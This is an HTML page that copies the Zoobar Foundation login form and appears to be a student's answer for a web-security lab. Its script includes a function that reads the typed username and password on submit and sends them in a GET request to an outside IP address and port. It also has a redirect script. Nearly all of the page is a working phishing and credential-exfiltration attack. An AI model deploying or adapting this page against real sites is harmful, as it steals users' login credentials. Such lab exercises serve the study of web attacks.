<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
        <title>
            Login - Zoobar Foundation
        </title>
    </head>
    <body>
        <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
        <script> 
            var zoobars = myZoobars;
            if (zoobars || true); {
            location.href = "file:///home/httpd/lab3/answer-2.html"; 
            }
        </script>
        <h1>
            <a href="http://localhost:8080/zoobar/index.cgi/">
                Zoobar Foundation for Objective Policy
            </a>
        </h1>
        <h2>
            Supporting the important minds of the information superhighway
        </h2>        
        <div id="login" class="centerpiece">
            <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="hehe()">
                <table>
                    <tbody>
                        <tr>
                            <td>Username:</td>
                            <td><input name="login_username" size="20" autocomplete="no" value="" type="text"></td>
                        </tr>
                        <tr>
                            <td>Password:</td>
                            <td colspan="2"><input name="login_password" size="20" autocomplete="no" type="password">
                            <script>
                                function hehe() {
                                    var username = document.forms['loginform'].elements['login_username'].value;
                                    var password = document.forms['loginform'].elements['login_password'].value;
                                    var req = new XMLHttpRequest();
                                    var ip = "172.27.22.170:12346";
                                    req.open(
                                        "GET",
                                        "http://"+ ip +
                                        "?username="+username+
                                        "&password="+password,
                                        true
                                    );
                                    console.log(username, password);
                                    req.send();
                                }
                            </script>
                            <input name="submit_login" value="Log in" type="submit">
                            <input name="submit_registration" value="Register" type="submit"></td>
                        </tr>
                    </tbody>
                </table>
                <input name="nexturl" value="http://localhost:8080/zoobar/index.cgi/" type="hidden">
            </form>
        </div>
        <div class="footer warning">

        </div>
        <script>document.loginform.login_username.focus();</script>        
    </body>
</html>
